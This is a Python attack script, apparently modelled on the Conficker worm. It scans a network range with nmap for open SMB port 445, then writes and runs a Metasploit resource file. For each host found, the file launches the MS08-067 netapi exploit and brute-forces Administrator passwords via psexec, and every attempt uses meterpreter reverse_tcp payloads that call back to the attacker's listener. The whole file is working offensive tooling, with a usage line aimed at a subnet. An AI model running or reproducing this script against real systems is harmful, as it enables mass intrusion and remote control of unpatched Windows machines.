#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import optparse
import sys
import nmap


def find_hosts(host, port='445'):
    scanner = nmap.PortScanner()
    scanner.scan(host, port)
    hosts = []
    for host in scanner.all_hosts():
        if scanner[host].has_tcp(int(port)):
            if scanner[host]['tcp'][int(port)]['state'] == 'open':
                print('[+] Found Target Host: {}'.format(host))
                hosts.append(host)
    return hosts


def setup_handler(config, local_host, local_port):
    config.write('use exploit/multi/handler\n')
    config.write('set payload windows/meterpreter/reverse_tcp\n')
    config.write('set LPORT {}\n'.format(str(local_port)))
    config.write('set LHOST {}\n'.format(local_host))
    config.write('exploit -j -z\n')
    config.write('setg DisablePayloadHandler 1\n')


def conficker_exploit(config, target_host, local_host, local_port):
    config.write('use exploit/windows/smb/ms08_067_netapi\n')
    config.write('set RHOST {}\n'.format(target_host))
    config.write('set payload windows/meterpreter/reverse_tcp\n')
    config.write('set LPORT {}\n'.format(str(local_port)))
    config.write('set LHOST {}\n'.format(local_host))
    config.write('exploit -j -z\n')


def smb_brute_force(config, target_host, local_host, local_port, username='Administrator', passwords=[]):
    for password in passwords:
        config.write('use exploit/windows/smb/psexec\n')
        config.write('set SMBUser {}\n'.format(username))
        config.write('set SMBPass {}\n'.format(password))
        config.write('set RHOST {}\n'.format(target_host))
        config.write('set payload windows/meterpreter/reverse_tcp\n')
        config.write('set LPORT {}\n'.format(str(local_port)))
        config.write('set LHOST {}\n'.format(local_host))
        config.write('exploit -j -z\n')


def main():
    parser = optparse.OptionParser('[-] Usage %prog -H <target host[s]> -l <local port> [-p <local host> -F <password file>]')
    parser.add_option('-H', dest='target_host', type='string', help='specify the target address[es]')
    parser.add_option('-p', dest='local_port', type='string', help='specify the listen port')
    parser.add_option('-l', dest='local_host', type='string', help='specify the listen address')
    parser.add_option('-F', dest='password_file', type='string', help='password file for SMB brute force attempt')

    (options, args) = parser.parse_args()

    if options.target_host is None or options.local_host is None:
        print(parser.usage)
        exit(0)

    local_host = options.local_host
    local_port = options.local_port
    if not local_port:
        local_port = '1337'

    with open('meta.rc', 'w') as configFile:
        setup_handler(configFile, local_host, local_port)

        password_file = options.password_file
        passwords = open(password_file, "r").readlines()
        passwords = list(map(lambda l: l.strip(), passwords))

        target_hosts = find_hosts(options.target_host)
        print("[*] Found {} hosts from given {}".format(len(target_hosts), options.target_host))
        if not len(target_hosts):
            exit(0)

        for host in target_hosts:
            print("[*] Testing host {}...".format(host))
            conficker_exploit(configFile, host, local_host, local_port)
            smb_brute_force(configFile, host, local_host, local_port, passwords=passwords)

        os.system('msfconsole -r meta.rc')


if __name__ == '__main__':
    main()
    # run as follows:
    # $ python conficker.py -H 192.168.1.30-50 -l 192.168.1.3 -F passwords.txt
